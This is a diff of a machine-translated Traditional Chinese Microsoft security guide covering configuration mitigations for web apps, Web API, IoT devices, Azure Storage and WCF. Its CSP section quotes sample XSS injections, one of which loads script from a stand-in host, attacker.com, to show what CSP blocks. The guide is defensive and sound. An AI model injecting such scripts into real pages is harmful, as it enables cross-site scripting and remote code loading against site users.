@@ -1,5 +1,5 @@
 ---
-title: 微軟威脅建模工具的配置管理
+title: Microsoft Threat Modeling Tool 的設定管理
 titleSuffix: Azure
 description: 降低威脅模型化工具所暴露的威脅
 services: security
@@ -16,43 +16,43 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-ms.openlocfilehash: ead6a79109c221d31ead96a202e97294ef218c5f
-ms.sourcegitcommit: acb82fc770128234f2e9222939826e3ade3a2a28
+ms.openlocfilehash: 499e4cb2cb62ccc170637bad60898b38b4ff3be7
+ms.sourcegitcommit: 67bddb15f90fb7e845ca739d16ad568cbc368c06
 ms.translationtype: MT
 ms.contentlocale: zh-TW
-ms.lasthandoff: 04/21/2020
-ms.locfileid: "81687984"
+ms.lasthandoff: 04/28/2020
+ms.locfileid: "82204248"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>安全框架︰組態管理 | 緩和措施 
 | 產品/服務 | 發行項 |
 | --------------- | ------- |
-| **Web 應用程式** | <ul><li>[實作內容安全性原則 (CSP)，並停用內嵌 javascript](#csp-js)</li><li>[啟用瀏覽器的 XSS 篩選器](#xss-filter)</li><li>[ASP.NET 應用程式必須在部署前停用追蹤和偵錯](#trace-deploy)</li><li>[只有從受信任的來源存取第三方 Javascript](#js-trusted)</li><li>[確保經過身份驗證的ASP.NET頁面包含 UI 糾正或單擊劫持防禦](#ui-defenses)</li><li>[確保在 ASP.NET Web 應用程式上啟用 CORS 的情況下只允許信任的原始來源](#cors-aspnet)</li><li>[在 ASP.NET 頁面上啟用 ValidateRequest 屬性](#validate-aspnet)</li><li>[使用在本機裝載的最新 JavaScript 程式庫版本](#local-js)</li><li>[停用自動 MIME 探查](#mime-sniff)</li><li>[移除 Windows Azure 網站上的標準伺服器標頭以避免記錄特徵](#standard-finger)</li></ul> |
+| **Web 應用程式** | <ul><li>[實作內容安全性原則 (CSP)，並停用內嵌 javascript](#csp-js)</li><li>[啟用瀏覽器的 XSS 篩選器](#xss-filter)</li><li>[ASP.NET 應用程式必須在部署前停用追蹤和偵錯](#trace-deploy)</li><li>[僅從信任的來源存取協力廠商僅 javascript](#js-trusted)</li><li>[確保已驗證的 ASP.NET 網頁會併入 UI 偽裝或按一下劫持的防護](#ui-defenses)</li><li>[確保在 ASP.NET Web 應用程式上啟用 CORS 的情況下只允許信任的原始來源](#cors-aspnet)</li><li>[在 ASP.NET 頁面上啟用 ValidateRequest 屬性](#validate-aspnet)</li><li>[使用在本機裝載的最新 JavaScript 程式庫版本](#local-js)</li><li>[停用自動 MIME 探查](#mime-sniff)</li><li>[移除 Windows Azure 網站上的標準伺服器標頭以避免記錄特徵](#standard-finger)</li></ul> |
 | **Database** | <ul><li>[設定用於 Database Engine 存取的 Windows 防火牆](#firewall-db)</li></ul> |
 | **Web API** | <ul><li>[確保在 ASP.NET Web API 上啟用 CORS 的情況下只允許信任的原始來源](#cors-api)</li><li>[加密包含敏感性資料的 Web API 組態檔區段](#config-sensitive)</li></ul> |
 | **IoT 裝置** | <ul><li>[確保使用強式認證保護所有系統管理介面](#admin-strong)</li><li>[確保未知的程式碼無法在裝置上執行](#unknown-exe)</li><li>[使用 Bitlocker 將 IoT 裝置的 OS 和其他磁碟分割加密](#partition-iot)</li><li>[確保在裝置上只啟用最少的服務/功能](#min-enable)</li></ul> |
-| **IoT 現場閘道** | <ul><li>[使用位鎖加密 IoT 的操作系統和其他分割區](#field-bit-locker)</li><li>[確保在安裝期間變更現場閘道的預設登入認證](#default-change)</li></ul> |
+| **IoT 現場閘道** | <ul><li>[使用位保險箱將 IoT 現場閘道的 OS 和其他磁碟分割加密](#field-bit-locker)</li><li>[確保在安裝期間變更現場閘道的預設登入認證](#default-change)</li></ul> |
 | **IoT 雲端閘道** | <ul><li>[確保雲端閘道會實作相關程序讓連接的裝置韌體保持最新狀態](#cloud-firmware)</li></ul> |
-| **電腦信任邊界** | <ul><li>[確保裝置具有根據組織策略配置的終端安全控制](#controls-policies)</li></ul> |
+| **電腦信任邊界** | <ul><li>[確保裝置具有根據組織原則設定的端點安全性控制項](#controls-policies)</li></ul> |
 | **Azure 儲存體** | <ul><li>[確保 Azure 儲存體存取金鑰的安全管理](#secure-keys)</li><li>[確保在 Azure 儲存體上啟用 CORS 的情況下只允許信任的原始來源](#cors-storage)</li></ul> |
-| **WCF** | <ul><li>[開啟 WCF 的服務限制功能](#throttling)</li><li>[WCF-透過中繼資料的資訊洩漏](#info-metadata)</li></ul> | 
+| **WCF** | <ul><li>[啟用 WCF 的服務節流功能](#throttling)</li><li>[WCF-透過中繼資料的資訊洩漏](#info-metadata)</li></ul> | 
 
 ## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>實作內容安全性原則 (CSP)，並停用內嵌 javascript
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | Web 應用程式 | 
 | **SDL 階段**               | Build |  
 | **適用的技術** | 泛型 |
 | **屬性**              | N/A  |
 | **參考**              | [內容安全性原則簡介](https://www.html5rocks.com/en/tutorials/security/content-security-policy/)、[內容安全性原則參考](https://content-security-policy.com/)、[安全性功能](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)、[內容安全性原則簡介](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy)、[我可以使用 CSP 嗎？](https://caniuse.com/#feat=contentsecuritypolicy) |
-| **步驟** | <p>內容安全性原則 (CSP) 是深度防禦安全性機制、W3C 標準，可讓 Web 應用程式擁有者能控制其網站中內嵌的內容。 CSP 會新增為 Web 伺服器上的 HTTP 回應標頭，並由瀏覽器在用戶端上強制執行。 這是以允許清單為基礎的原則 - 網站可以宣告一組可從中載入主動式內容 (例如 JavaScript) 的受信任網域。</p><p>CSP 具有以下安全性優勢：</p><ul><li>**防禦 XSS︰** 如果頁面遭受 XSS 威脅，攻擊者入侵它的方式有 2 種︰<ul><li>插入 `<script>malicious code</script>`。 由於 CSP 的基本限制-1,此漏洞將不起作用</li><li>插入 `<script src="http://attacker.com/maliciousCode.js"/>`。 此漏洞將不起作用,因為攻擊者控制的域將不會在 CSP 的域白名單中</li></ul></li><li>**控制資料外洩︰** 如果網頁上的任何惡意內容嘗試連線至外部網站並竊取資料，CSP 將會中止連線。 這是因為目標域不在 CSP 的白名單中</li><li>**防止點擊劫持:** 點擊劫持是一種攻擊技術,攻擊者可以用它來構建一個真正的網站,並迫使用戶點擊UI元素。 目前可藉由設定回應標頭- X-Frame-Options 來防禦點擊劫持。 並非所有瀏覽器都遵守此標頭，而轉寄 CSP 會是防禦點擊劫持的標準方法</li><li>**即時攻擊報告︰** 如果已啟用 CSP 的網站上有資料隱碼攻擊，則瀏覽器會自動對 Web 伺服器上設定的端點觸發通知。 如此一來，CSP 可當作即時警告系統。</li></ul> |
+| **步驟** | <p>內容安全性原則 (CSP) 是深度防禦安全性機制、W3C 標準，可讓 Web 應用程式擁有者能控制其網站中內嵌的內容。 CSP 會新增為 Web 伺服器上的 HTTP 回應標頭，並由瀏覽器在用戶端上強制執行。 這是以允許清單為基礎的原則 - 網站可以宣告一組可從中載入主動式內容 (例如 JavaScript) 的受信任網域。</p><p>CSP 具有以下安全性優勢：</p><ul><li>**防禦 XSS︰** 如果頁面遭受 XSS 威脅，攻擊者入侵它的方式有 2 種︰<ul><li>插入 `<script>malicious code</script>`。 因為 CSP 的基底限制，此入侵將無法使用-1</li><li>插入 `<script src="http://attacker.com/maliciousCode.js"/>`。 因為攻擊者控制的網域不會在網域的 CSP 白名單中，所以此入侵將無法作用。</li></ul></li><li>**控制資料外洩︰** 如果網頁上的任何惡意內容嘗試連線至外部網站並竊取資料，CSP 將會中止連線。 這是因為目標網域不會在 CSP 的白名單中</li><li>**防禦劫持：** 按一下-劫持是一種攻擊技巧，可讓敵人將正版網站框住，並強制使用者按一下 UI 元素。 目前可藉由設定回應標頭- X-Frame-Options 來防禦點擊劫持。 並非所有瀏覽器都遵守此標頭，而轉寄 CSP 會是防禦點擊劫持的標準方法</li><li>**即時攻擊報告︰** 如果已啟用 CSP 的網站上有資料隱碼攻擊，則瀏覽器會自動對 Web 伺服器上設定的端點觸發通知。 如此一來，CSP 可當作即時警告系統。</li></ul> |
 
 ### <a name="example"></a>範例
 範例原則︰ 
 ```csharp
 Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
 ```
-此策略允許文稿僅從 Web 應用程式的伺服器和 google 分析伺服器載入。 將會拒絕從任何其他網站載入的指令碼。 在網站上啟用 CSP 後，下列功能會自動停用以緩和 XSS 攻擊。 
+此原則只允許從 web 應用程式的伺服器和 google analytics 分析伺服器載入腳本。 將會拒絕從任何其他網站載入的指令碼。 在網站上啟用 CSP 後，下列功能會自動停用以緩和 XSS 攻擊。 
 
 ### <a name="example"></a>範例
 將不會執行內嵌指令碼。 以下是內嵌指令碼的範例 
@@ -70,7 +70,7 @@ Example: var str="alert(1)"; eval(str);
 
 ## <a name="enable-browsers-xss-filter"></a><a id="xss-filter"></a>啟用瀏覽器的 XSS 篩選器
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | Web 應用程式 | 
 | **SDL 階段**               | Build |  
@@ -81,7 +81,7 @@ Example: var str="alert(1)"; eval(str);
 
 ## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>ASP.NET 應用程式必須在部署前停用追蹤和偵錯
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | Web 應用程式 | 
 | **SDL 階段**               | Build |  
@@ -92,28 +92,28 @@ Example: var str="alert(1)"; eval(str);
 
 ## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>僅從信任的來源存取第三方 javascript
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | Web 應用程式 | 
 | **SDL 階段**               | Build |  
 | **適用的技術** | 泛型 |
 | **屬性**              | N/A  |
 | **參考**              | N/A  |
-| **步驟** | 僅能從信任的來源參照第三方 JavaScript。 參考端點應一律位於 SSL。 |
+| **步驟** | 僅能從信任的來源參照第三方 JavaScript。 參考端點應一律在 TLS 上。 |
 
-## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>確保經過身份驗證的ASP.NET頁面包含 UI 糾正或單擊劫持防禦
+## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>確保已驗證的 ASP.NET 網頁會併入 UI 偽裝或按一下劫持的防護
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | Web 應用程式 | 
 | **SDL 階段**               | Build |  
 | **適用的技術** | 泛型 |
 | **屬性**              | N/A  |
-| **參考**              | [OWASP 點擊劫持防禦備忘表](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), [IE 內部 - 打擊點擊劫持與 X 幀選項](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
+| **參考**              | [OWASP 按一下劫持防禦](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)功能提要、 [IE 內部-防禦按一下劫持與 X 框架選項](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
 | **步驟** | <p>點擊劫持 (Clickjacking) 也稱為「UI 偽裝攻擊」，當使用者打算按一下最上層頁面時，攻擊者會使用多重透明或不透明層級來誘騙使用者按一下另一個頁面上的按鈕或連結。</p><p>使用 iframe 製作惡意頁面，以載入受害者的頁面，即可達成此分層處理。 因此，攻擊者會「劫持」頁面所需的點擊，並將其路由傳送至另一個頁面，該頁面最可能由另一個應用程式、網域或兩者所擁有。 若要避免點擊劫持攻擊，請設定適當的 X-Frame-Options HTTP 回應標頭，以指示瀏覽器不允許從其他網域進行框架處理</p>|
 
 ### <a name="example"></a>範例
-X-FRAME-OPTIONS 標頭可透過 IIS Web.config 進行設置。不應陷害的網站的 Web.config 代碼段: 
+X 框架選項標頭可以透過 IIS web.config 來設定。絕對不應加上框架之網站的 web.config 程式碼片段： 
 ```csharp
     <system.webServer>
         <httpProtocol>
@@ -138,7 +138,7 @@ X-FRAME-OPTIONS 標頭可透過 IIS Web.config 進行設置。不應陷害的網
 
 ## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-applications"></a><a id="cors-aspnet"></a>確保在 ASP.NET Web 應用程式上啟用 CORS 的情況下只允許信任的原始來源
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | Web 應用程式 | 
 | **SDL 階段**               | Build |  
@@ -169,7 +169,7 @@ HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://exampl
 
 ## <a name="enable-validaterequest-attribute-on-aspnet-pages"></a><a id="validate-aspnet"></a>在 ASP.NET 頁面上啟用 ValidateRequest 屬性
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | Web 應用程式 | 
 | **SDL 階段**               | Build |  
@@ -195,7 +195,7 @@ HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://exampl
 
 ## <a name="use-locally-hosted-latest-versions-of-javascript-libraries"></a><a id="local-js"></a>使用在本機裝載的最新 JavaScript 程式庫版本
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | Web 應用程式 | 
 | **SDL 階段**               | Build |  
@@ -206,7 +206,7 @@ HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://exampl
 
 ## <a name="disable-automatic-mime-sniffing"></a><a id="mime-sniff"></a>停用自動 MIME 探查
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | Web 應用程式 | 
 | **SDL 階段**               | Build |  
@@ -271,7 +271,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 
 ## <a name="remove-standard-server-headers-on-windows-azure-web-sites-to-avoid-fingerprinting"></a><a id="standard-finger"></a>移除 Windows Azure 網站上的標準伺服器標頭以避免記錄特徵
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | Web 應用程式 | 
 | **SDL 階段**               | Build |  
@@ -280,9 +280,9 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 | **參考**              | [移除 Windows Azure 網站上的標準伺服器標頭](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
 | **步驟** | Server、X-Powered-By、X-AspNet-Version 等標頭會揭露有關伺服器和基礎技術的資訊。 建議不要顯示這些標頭，藉此防止記錄應用程式特徵 |
 
-## <a name="configure-a-windows-firewall-for-database-engine-access"></a><a id="firewall-db"></a>設定用於 Database Engine 存取的 Windows 防火牆
+## <a name="configure-a-windows-firewall-for-database-engine-access"></a><a id="firewall-db"></a>設定資料庫引擎存取的 Windows 防火牆
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | 資料庫 | 
 | **SDL 階段**               | Build |  
@@ -293,7 +293,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 
 ## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-api"></a><a id="cors-api"></a>確保在 ASP.NET Web API 上啟用 CORS 的情況下只允許信任的原始來源
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | Web API | 
 | **SDL 階段**               | Build |  
@@ -389,7 +389,7 @@ public class ResourcesController : ApiController
 }
 ```
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | Web API | 
 | **SDL 階段**               | Build |  
@@ -481,7 +481,7 @@ public void ConfigureServices(IServiceCollection services)
 
 ## <a name="encrypt-sections-of-web-apis-configuration-files-that-contain-sensitive-data"></a><a id="config-sensitive"></a>加密包含敏感性資料的 Web API 組態檔區段
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | Web API | 
 | **SDL 階段**               | 部署 |  
@@ -492,7 +492,7 @@ public void ConfigureServices(IServiceCollection services)
 
 ## <a name="ensure-that-all-admin-interfaces-are-secured-with-strong-credentials"></a><a id="admin-strong"></a>確保使用強式認證保護所有系統管理介面
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | IoT 裝置 | 
 | **SDL 階段**               | 部署 |  
@@ -503,7 +503,7 @@ public void ConfigureServices(IServiceCollection services)
 
 ## <a name="ensure-that-unknown-code-cannot-execute-on-devices"></a><a id="unknown-exe"></a>確保無法在裝置上執行不明的程式碼
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | IoT 裝置 | 
 | **SDL 階段**               | Build |  
@@ -514,7 +514,7 @@ public void ConfigureServices(IServiceCollection services)
 
 ## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>使用 Bitlocker 將 IoT 裝置的 OS 和其他磁碟分割加密
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | IoT 裝置 | 
 | **SDL 階段**               | Build |  
@@ -525,7 +525,7 @@ public void ConfigureServices(IServiceCollection services)
 
 ## <a name="ensure-that-only-the-minimum-servicesfeatures-are-enabled-on-devices"></a><a id="min-enable"></a>確保在裝置上只啟用最少的服務/功能
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | IoT 裝置 | 
 | **SDL 階段**               | 部署 |  
@@ -534,9 +534,9 @@ public void ConfigureServices(IServiceCollection services)
 | **參考**              | N/A  |
 | **步驟** | 請勿在並非解決方案運作所需的 OS 中啟用或關閉任何功能或服務。 例如︰如果裝置不需要部署 UI，請在無周邊模式下安裝 Windows IoT Core。 |
 
-## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>使用位鎖加密 IoT 的操作系統和其他分割區
+## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>使用位保險箱將 IoT 現場閘道的 OS 和其他磁碟分割加密
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | IoT 現場閘道 | 
 | **SDL 階段**               | 部署 |  
@@ -547,7 +547,7 @@ public void ConfigureServices(IServiceCollection services)
 
 ## <a name="ensure-that-the-default-login-credentials-of-the-field-gateway-are-changed-during-installation"></a><a id="default-change"></a>確保在安裝期間變更現場閘道的預設登入認證
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | IoT 現場閘道 | 
 | **SDL 階段**               | 部署 |  
@@ -558,7 +558,7 @@ public void ConfigureServices(IServiceCollection services)
 
 ## <a name="ensure-that-the-cloud-gateway-implements-a-process-to-keep-the-connected-devices-firmware-up-to-date"></a><a id="cloud-firmware"></a>確保雲端閘道會實作相關程序讓連接的裝置韌體保持最新狀態
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | IoT 雲端閘道 | 
 | **SDL 階段**               | Build |  
@@ -569,7 +569,7 @@ public void ConfigureServices(IServiceCollection services)
 
 ## <a name="ensure-that-devices-have-end-point-security-controls-configured-as-per-organizational-policies"></a><a id="controls-policies"></a>確保裝置已根據組織的原則設定端點安全性控制項
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | 電腦信任邊界 | 
 | **SDL 階段**               | 部署 |  
@@ -580,7 +580,7 @@ public void ConfigureServices(IServiceCollection services)
 
 ## <a name="ensure-secure-management-of-azure-storage-access-keys"></a><a id="secure-keys"></a>確保 Azure 儲存體存取金鑰的安全管理
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | Azure 儲存體 | 
 | **SDL 階段**               | 部署 |  
@@ -591,7 +591,7 @@ public void ConfigureServices(IServiceCollection services)
 
 ## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-azure-storage"></a><a id="cors-storage"></a>確保在 Azure 儲存體上啟用 CORS 的情況下只允許信任的原始來源
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | Azure 儲存體 | 
 | **SDL 階段**               | Build |  
@@ -602,7 +602,7 @@ public void ConfigureServices(IServiceCollection services)
 
 ## <a name="enable-wcfs-service-throttling-feature"></a><a id="throttling"></a>啟用 WCF 的服務節流功能
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | WCF | 
 | **SDL 階段**               | Build |  
@@ -625,7 +625,7 @@ public void ConfigureServices(IServiceCollection services)
 
 ## <a name="wcf-information-disclosure-through-metadata"></a><a id="info-metadata"></a>WCF-透過中繼資料的資訊洩漏
 
-| Title                   | 詳細資料      |
+| 標題                   | 詳細資料      |
 | ----------------------- | ------------ |
 | **元件**               | WCF | 
 | **SDL 階段**               | Build |  
